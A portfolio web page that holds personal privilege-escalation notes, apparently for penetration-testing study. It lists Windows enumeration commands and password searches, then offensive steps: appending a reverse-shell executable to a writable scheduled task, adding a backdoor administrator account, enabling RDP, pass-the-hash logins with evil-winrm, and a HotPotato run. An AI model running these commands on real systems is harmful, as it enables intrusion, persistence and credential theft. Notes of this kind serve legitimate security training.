<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="assets/css/method-styles.css">

    <title>TITLE</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="#" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="#home" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div>
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="000917ee-4910-4392-bb17-c415ef54fab4" class="page sans"><header><h1 class="page-title">Initial Enumeration</h1></header><div class="page-body"><ul id="5d863a0a-efda-4451-819f-9c6ecf3e668c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/">https://sirensecurity.io/blog/windows-privilege-escalation-resources/</a></li></ul><ul id="753453a8-330a-4fd1-bfb0-a2500d4c21ec" class="bulleted-list"><li style="list-style-type:disc">fuzzysecurity <a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></li></ul><ul id="df18ddc3-5b3d-4e84-8e6d-1e967668d399" class="bulleted-list"><li style="list-style-type:disc">Absolomb Windows Privilege Escalation Guide - <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li></ul><ul id="b90a6585-1432-44a0-b7de-e7a36089305b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a></li></ul><ul id="e613e752-b974-46c2-8454-4930b0b9134e" class="bulleted-list"><li style="list-style-type:disc">Sushant 747&#x27;s Guide (Country dependant - may need VPN) - <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></li></ul><hr id="bc6229f6-9d53-44c9-90e5-e41e550211c3"/><ul id="52244d5b-10b8-498d-84ff-bec13a83c0f6" class="bulleted-list"><li style="list-style-type:disc">System integrity process: SYSTEM rights</li></ul><ul id="dea82d5d-92b3-457e-87f2-32a102e4f34c" class="bulleted-list"><li style="list-style-type:disc">High integrity process: administrative rights</li></ul><ul id="2cc567ab-62df-4729-a669-2e71e73bbc64" class="bulleted-list"><li style="list-style-type:disc">Medium integrity process: standard user rights</li></ul><ul id="34a496fd-d521-4a3f-a503-937ecf69db4a" class="bulleted-list"><li style="list-style-type:disc">Low integrity process: very restricted rights often used in
sandboxed processes</li></ul><hr id="e6e0438c-dba4-4607-a9d2-75dc093df7d0"/><p id="a36e7873-04df-494b-bc42-c26e71751f01" class=""><strong>Methodology:</strong></p><ol type="1" id="b0104712-e5be-45b4-8db3-9afa3e9b9251" class="numbered-list" start="1"><li>See what tools are installed that I usually use (which python3, which wget, which curl, which nc, etc. Also uname -a to see kernel version.</li></ol><ol type="1" id="0145bf85-189d-4529-9052-aee0e44fe127" class="numbered-list" start="2"><li>list out all files in directories such as /tmp, /opt, /mnt, /media, /home,
/etc/passwd (write perms?), /var/www/ (config files?), numerous times
just doing this has shown me the path to root that other scripts
wouldn&#x27;t really find.</li></ol><ol type="1" id="5ad529d5-3993-4e1d-a4a6-707dbe743f51" class="numbered-list" start="3"><li>echo $PATH (anything weird?), cat /etc/crontab (any weird jobs?), sudo -l (any sudo perms?)</li></ol><ol type="1" id="375effa3-8182-4a71-b189-30899793d3f3" class="numbered-list" start="4"><li>finally, look for SUID perms on files and compare output against <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>find <strong>/</strong> -perm <strong>u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></li></ol><ol type="1" id="5422034e-1dcb-496e-a5fd-0bafda539a08" class="numbered-list" start="5"><li>then run linpeas<strong>Windows:</strong> <a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/windows-privilege-escalation-resources/</strong></a></li></ol><ol type="1" id="f8f83746-3d36-4863-84df-759b923aa827" class="numbered-list" start="6"><li>whoami /priv (seImpersonate?), net users (any other users?), net user &lt;username&gt; (are you admin group? UACBypass?)</li></ol><ol type="1" id="a190acd8-8717-4780-8d20-efa22c85f173" class="numbered-list" start="7"><li>Again look in a bunch of directories, this has found the way a lot of times.
Look in C:\ (any backup directory or something odd?), C:\Program Files
&amp; Program Files (x86) (for the non-windows folders, look up any priv esc vulnerabilities with them?), C:\Users, C:\Windows\Temp</li></ol><ol type="1" id="5bed8b10-80d9-4667-9524-b6ed6712b55f" class="numbered-list" start="8"><li>wmic service get name,startname, this will list services, I usually skim
through this quick and look at any non windows ones. Specifically the
binary path, either if its unquoted or if you have write access to the
directory of the binary.</li></ol><ol type="1" id="f7c229e6-9da7-42f0-9be3-5cc684df06d4" class="numbered-list" start="9"><li>winpeas, make note of the section that tells you what directories are writeable by you.</li></ol><p id="7fa48cc3-3d54-4fe1-b97e-87d0ffa24b39" class="">
</p><hr id="cddd09d6-2b74-4623-9515-aab592ee04d7"/><p id="f57ba8c3-9c7c-4573-9bd7-acb61c3dcda7" class=""><strong>System Enumeration:</strong></p><pre id="3f9b9ce4-a995-4047-a18a-234ee5d6dd4a" class="code"><code>systeminfo
systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
sysinfo (meterpreter)</code></pre><p id="9b62d99d-fe8d-45f4-a477-a4af3b804750" class="">
</p><ul id="b24e8860-a744-442b-9ddc-1617c3374b2a" class="bulleted-list"><li style="list-style-type:disc">Looking at patches hot fixes:</li></ul><pre id="24149cdf-c749-4194-a8ea-2a6f040e0735" class="code"><code>wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmi product get name, version, vendor</code></pre><ul id="8f0f4a92-7dff-4f8e-b536-5856360b6fbb" class="bulleted-list"><li style="list-style-type:disc">Listing drives:</li></ul><pre id="3c544e29-f12f-4f17-9c80-17a2ff255b02" class="code"><code>wmic logicaldisk
list drives
wmic logicaldisk get caption,description,providername</code></pre><p id="c798bad5-c100-4121-be18-16929f02d65e" class="">
</p><p id="51607327-99c3-42bf-9df7-277b3c3b2cc2" class=""><strong>User Enumeration:</strong></p><p id="fa39ec7c-0e75-43aa-888e-e668585793d4" class="">
</p><ul id="23818f36-82a5-4b20-ad36-8bed1843ad01" class="bulleted-list"><li style="list-style-type:disc">name</li></ul><pre id="226ed712-ac0e-47e9-bb45-00b14d1baa7d" class="code"><code>whoami</code></pre><ul id="15499b58-e007-4a23-ac19-70b8e21c1b3e" class="bulleted-list"><li style="list-style-type:disc">priv</li></ul><pre id="357946aa-5514-4888-83d1-abdf8dd93d94" class="code"><code>whoami /priv</code></pre><ul id="c59c1037-7a87-426d-8cab-8268b08755d8" class="bulleted-list"><li style="list-style-type:disc">groups</li></ul><pre id="dbfc2030-3da0-4c09-8bef-fc0fecd6f80c" class="code"><code>whoami /groups</code></pre><p id="84781da2-2f9c-4aa4-b4a3-c522d33c32b7" class="">
</p><ul id="d798a691-b167-4171-8c7e-ded37253a3ce" class="bulleted-list"><li style="list-style-type:disc">info on users</li></ul><pre id="05035c1f-a871-44b2-9454-e3b39fa5aef0" class="code"><code>net user &lt;user&gt;
net user domain
net user
#change password
net user &lt;user&gt; &lt;password&gt;</code></pre><ul id="d2401a9d-25cc-427a-b5c1-cbe5b0e51f45" class="bulleted-list"><li style="list-style-type:disc">local groups</li></ul><pre id="f9460f22-0553-4cd1-a15a-2e337cce09b2" class="code"><code>net localgroups
net localgroup &lt;group?&gt;</code></pre><p id="defb30b1-24fc-4959-8c5b-e7142fef8f48" class="">
</p><p id="7012570f-482c-40b0-ae78-417b382b8069" class=""><strong>Network Enumeration:</strong></p><ul id="93b36466-68cd-49b8-9b59-cf762c80200e" class="bulleted-list"><li style="list-style-type:disc">ip config</li></ul><pre id="101bd221-59ff-49bd-a1ec-17456bcb7a6a" class="code"><code>ipconfig (/all)</code></pre><p id="834fa83f-713f-4218-871c-ba9b1b812120" class="">arp table</p><pre id="39f0fa88-9509-4236-b8b3-97e75c064325" class="code"><code>arp -a</code></pre><p id="56a08bfc-6f51-446f-89c1-40ea13bc8e78" class="">routing table</p><pre id="d43ddb66-9c7d-4b68-a8a8-d12dab41d125" class="code"><code>route print</code></pre><p id="69c2dd2c-74fc-40f0-a91c-5e45ab212071" class=""> netstat</p><pre id="c79b4aff-2c0e-4ea0-8ed3-f7e9de4893d3" class="code"><code>netstat -ano</code></pre><p id="82078565-cab1-416f-83e9-b0a3991eb82f" class="">
</p><p id="5af5067a-9e00-4a60-ae02-9bc3c6deb874" class=""><strong>Password Hunting:</strong></p><pre id="1725608f-9c6a-4cd0-8b09-8327d56dcf22" class="code"><code>findstr /si password *.txt *.ini *.config</code></pre><p id="e08e800c-d100-4187-938d-6d52f3a8a3ed" class="">
</p><p id="8a0b9de3-1662-4f8f-9a2f-5e6e25716a8e" class=""><strong>Firewall and AV Enumeration:</strong></p><p id="9da1f1c3-0881-469e-a442-0780ccf43016" class="">service control</p><pre id="c812f72e-b6c1-4b67-aaee-40c3ee574a11" class="code"><code>sc query windefend
sc queryex type= service</code></pre><p id="2e2c8800-2601-4d1b-8fc9-2601c1631691" class="">Firewall settings:</p><pre id="b32efded-9d9b-4757-aed3-e459b38c720e" class="code"><code>netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config</code></pre><p id="93de35ca-3035-4dd4-8e6c-f9de104e75f6" class=""><strong><strong><strong><strong><strong><strong><strong><strong>Drivers:</strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="602d6923-ffa8-4d06-a3ba-48f6a1769dd4" class="code"><code>driverquery /v
#Powershell
powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</code></pre><p id="4a4bfafd-e5a9-47a3-bec7-906a1a44f862" class=""><strong>Scheduled Tasks:</strong></p><pre id="12e115d8-6a35-4441-9d8f-a5e6e150a402" class="code"><code>schtasks /query /fo LIST /v
PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State
#Using accesschk.exe, note that you have the ability to write to this file:
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\task.ps1
#Start a listener on Kali and then append a line to the C:\DevTools\task.ps1 which runs the reverse.exe executable you created:
echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\setup.ps1
</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class="">
</p><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
</p><p id="436378b6-ed64-449c-a14d-4abca7341669" class=""><strong>Add user:</strong></p><pre id="a82198ea-45a7-49ff-b5bb-11ad3eb11e40" class="code"><code>net user test password123! /add
net localgroup Administrators test /add
net localgroup &quot;Remote Desktop Users&quot; test /add
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
rdesktop 0.0.0.0 -u test -p password123!</code></pre><p id="61275796-528c-46d2-aea0-1d715502547d" class=""><strong><strong><strong><strong>Change User Password:</strong></strong></strong></strong></p><pre id="ac7042b1-4412-41fe-898e-b22f331d697b" class="code"><code>net user admin password!123</code></pre><p id="7098c321-6191-40c2-9439-96d0c8947836" class="">Another way:</p><pre id="a20d2dac-c504-4bd4-91d2-98f562e46a0b" class="code"><code>text.txt | net user pwn Password1! /add; net localgroup administrators pwn /add</code></pre><p id="5671aa8a-e112-4df1-bbd5-f4b72bf63c46" class="">
</p><p id="1996e6d3-9066-4af2-84b4-2894e8a771bd" class=""><strong>Find writable directories/files</strong></p><pre id="de998531-11ad-4f26-9045-4f5a935fa3cb" class="code"><code>find / -type d -writable -print
find -type f -maxdepth 1 -writable
accesschk.exe -uws &quot;Everyone&quot; &quot;C:/Program Files&quot;
#powershell
Get-ChildItem &quot;C:\Program Files&quot; - Recurse | Get-ACL | ?{$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;}</code></pre><p id="07752bc6-a641-437b-8c75-bd5ffc00aab2" class=""><strong>Find writable directories</strong></p><p id="f6e25951-13ad-4b23-9487-cdf801b8e394" class="">
</p><p id="685e7923-834d-449a-bd46-0d3988956727" class="">Check app data for powershell history, clear text credentials</p><p id="d6e09ed3-3045-43e7-92ba-b19fa215d8b0" class="">Check recycle bins, saved browser passwords, saved program passwords.</p><p id="080dba3d-0a40-4445-bad5-c4399dbb2ac7" class="">
</p><p id="86f8489f-f7ac-451d-875d-c72e2238d843" class=""><strong>Evil Winrm:</strong></p><pre id="90e3c2a9-00f7-431a-91b9-fdba506f5652" class="code"><code>evil-winrm -i 0.0.0.0 -u pwn -p &#x27;Password1!&#x27;
evil-winrm -i 0.0.0.0 -u pwn -H &lt;Hash&gt;
crackmapexec winrm -u pwn -H &lt;Hash&gt;</code></pre><p id="6c99333a-7bd3-4c18-b089-67a762d7ff16" class="">
</p><p id="15adbf57-025e-4eb2-bd07-04d95bf3692e" class=""><strong>Enabling remote desktop:</strong></p><p id="0c0b8241-bbc5-4715-9719-996a6d698985" class=""><a href="https://www.thewindowsclub.com/enable-remote-desktop-using-command-line">https://www.thewindowsclub.com/enable-remote-desktop-using-command-line</a></p><pre id="d00e005d-f267-46db-98f3-6829ee926d79" class="code"><code>#Command Line
reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes
#Powershell
Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;-name &quot;fDenyTSConnections&quot; -Value 0
Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class="">Using Remote Desktop:</p><pre id="003c60ec-b894-42ea-8d96-1ca4ae7059da" class="code"><code>xfreerdp /v:0.0.0.0 /u:Username /p:Password /cert:ignore /workarea
rdesktop 0.0.0.0 -u Username -p Password -d Domain.local
</code></pre><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class="">HotPotato:</p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>.\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre><p id="7dc31774-c491-44a5-a599-dcbdb6c3ae70" class="">
</p></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="assets/js/main.js"></script>
</body>
</html>